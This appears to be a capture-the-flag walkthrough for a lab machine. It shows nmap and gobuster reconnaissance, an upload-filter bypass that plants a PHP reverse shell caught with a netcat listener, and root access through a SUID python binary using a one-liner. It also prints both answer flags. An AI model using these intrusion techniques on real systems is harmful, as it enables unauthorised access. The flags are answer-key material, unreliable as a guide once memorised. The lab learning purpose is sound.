Prep
```
target="10.10.67.74"
ping $target
```

# Task 2 - Reconnaissance

### First, let's get information about the target.

##### Scan the machine, how many ports are open?

```
─# nmap -sS -Pn -p- -T4 -sC $target
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 18:16 EDT
Nmap scan report for 10.10.67.74
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT STATE SERVICE
22/tcp open ssh
| ssh-hostkey:
| 2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
| 256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_ 256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open http
| http-cookie-flags:
| /:
| PHPSESSID:
|_ httponly flag not set
|_http-title: HackIT - Home
 
Nmap done: 1 IP address (1 host up) scanned in 777.82 seconds
```

Answer: `2`

##### What version of Apache is running?

```
─# nmap -sS -Pn -p 22,80 -sV -T4 $target     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 18:39 EDT
Nmap scan report for 10.10.67.74
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds
```

Answer: `2.4.29`

##### What service is running on port 22?

Answer: `ssh`

##### What is the hidden directory?

```
└─# gobuster dir -u $target -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.67.74
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.67.74/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 307] [--> http://10.10.67.74/js/]
/panel                (Status: 301) [Size: 310] [--> http://10.10.67.74/panel/]
/server-status        (Status: 403) [Size: 276]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.67.74/uploads/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

Answer: `/panel/`


# Task 3 Getting a shell

##### Find a form to upload and get a reverse shell, and find the flag.

##### user.txt

Looking at the URL we have panel is an upload form

http://$target/panel/

![[task3GettingAShell01.png]]

http://$target/uploads/ looks to be a file listing of the uploads folder

![[task3GettingAShell02.png]]

Uploading an image from /panel/ seems to work

![[task3GettingAShell03.png]]

![[task3GettingAShell04.png]]

![[task3GettingAShell05.png]]

Wapalyzer shows it is a PHP form, so PHP reverse shell

Using https://github.com/ivan-sincek/php-reverse-shell
Modify IP and port

Upload this file failed as the filetype upload is restricted
Rename `shell.php` to `shell.pHp` upload also failed, but `shell.php2` worked

Run the listener `nc -vnlp 8884`

This didn't work, when the shell was run nothing came back, and the error output of the screen was on the web screen.

Renamed the file to shell.jpg.php and upload, still fails.  A bit of trial and error from https://book.hacktricks.xyz/pentesting-web/file-upload and I found that `shell.php....` seems to work.

```
└─# nc -vnlp 8884  
listening on [any] 8884 ...
connect to [10.4.18.254] from (UNKNOWN) [10.10.67.74] 46660
SOCKET: Shell has connected! PID: 1683
whoami
www-data

```

Navigate the file system to find a user flag
```
cat user.txt
THM{y0u_g0t_a_sh3ll}
pwd
/var/www

```

Answer: `THM{y0u_g0t_a_sh3ll}`

# Task 4 Privilege escalation

### Now that we have a shell, let's escalate our privileges to root.

##### Search for files with SUID permission, which file is weird?

```
cd ..
cd ..
pwd
/
find / -perm -u=s -type f 2>/dev/null
```

There are a few there, but `/usr/bin/python` fits the solution mask

Answer: `/usr/bin/python`

##### Find a form to escalate your privileges.

https://gtfobins.github.io/gtfobins/python/#suid

```
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
```
##### root.txt

```
pwd
/var/www/html/uploads
cd /root
ls
root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

Answer: `THM{pr1v1l3g3_3sc4l4t10n}`